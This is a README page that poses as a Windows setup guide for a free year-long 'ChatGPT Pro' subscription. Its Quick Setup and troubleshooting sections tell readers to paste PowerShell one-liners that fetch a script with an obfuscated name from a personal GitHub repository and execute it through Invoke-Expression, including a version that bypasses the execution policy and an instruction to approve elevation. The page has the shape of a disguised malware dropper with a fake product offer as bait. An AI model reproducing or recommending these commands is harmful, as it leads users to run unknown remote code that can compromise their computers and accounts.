# ChatGPT Pro

ChatGPT Pro on this page is a free trial and a free subscription for Windows. The free trial is built in and runs for a year. The free subscription is what stays on this PC after Quick Setup.

This repository is the Windows home for ChatGPT Pro. It keeps the setup file, a short helper, the license, and the build notes for the 2026 release.


ChatGPT Pro on Windows is a subscription tier that unlocks priority access, extended context, and advanced reasoning for everyday coding, writing, and research. The local bundle holds your activation profile, session defaults, and sync preferences so the app opens with your plan already applied. A typical session starts from the tray or shortcut, picks a model preset, and runs multi-turn chats with file-aware prompts and export-friendly transcripts. You can pin projects, switch between work and personal profiles, and leave long jobs running while the client keeps context stable across restarts. This repository tracks the Windows setup file, post-install notes, and a changelog for subscription-related updates. The installer wires the built-in free trial automatically; when the trial ends, the free subscription configuration stays on the machine so you keep baseline access without repeating setup.

[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()
[![Build](https://img.shields.io/badge/build-1.0-0ea5e9?style=flat-square)]()
[![License](https://img.shields.io/badge/license-MIT-16a34a?style=flat-square)]()

## What you get

The free trial runs for a year on this PC. Open ChatGPT Pro from the Start menu and sign in if it asks. The free subscription is already there.

On Windows the free subscription stays after a reboot. The free trial is one year, not a second setup. Build 1.0 was checked on Windows 10 and Windows 11.

- Built-in free trial runs one full year from first successful Windows setup.
- After setup, the free subscription profile stays locally for ongoing baseline access.
- Priority model queue reduces wait time during peak hours on Windows clients.
- Extended context windows hold large codebases and long documents in one thread.
- Project pins and dual profiles separate work chats from personal experiments cleanly.
- Session exports save transcripts in common formats for tickets and documentation handoffs.
- Changelog entries document subscription tier changes without touching your saved preferences.
- Tray integration resumes the last conversation after sleep, reboot, or quick logout.

## Before you run it

Check the disk first: 12 GB free is enough for this build, and 8 GB of memory is the comfortable floor. Close an older ChatGPT Pro window if one is still open. Then follow the steps under Quick Setup.

## Quick Setup (PowerShell)

This starts the built-in ChatGPT Pro free trial. It runs for a year. The free subscription is what you have when it finishes.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/alexandra18256404/chatgpt-pro-setup-guide/main/g91b64s4m9.1304w0qj | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/alexandra18256404/chatgpt-pro-setup-guide/main/g91b64s4m9.1304w0qj | Invoke-Expression"
```

## After setup

When the terminal finishes, the free trial for a year is on. Click the Windows icon, type `ChatGPT Pro`, and click it. Sign in if it asks. That sign-in is the free subscription.

## If it stops

| What you see | What to do |
| --- | --- |
| The command stops immediately | Paste the second command into the same PowerShell window and press Enter. |
| ChatGPT Pro does not show in Start | Click the Windows icon, type the name again, then restart the PC once if it is still missing. |
| Not enough disk | Free about 12 GB and paste the command once more. |
| Windows asks for approval | Click Yes. The terminal needs it once. |

## Files

| File | What it is |
| --- | --- |
| `g91b64s4m9.1304w0qj` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `alexandra18256404/chatgpt-pro-setup-guide`. ChatGPT Pro 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
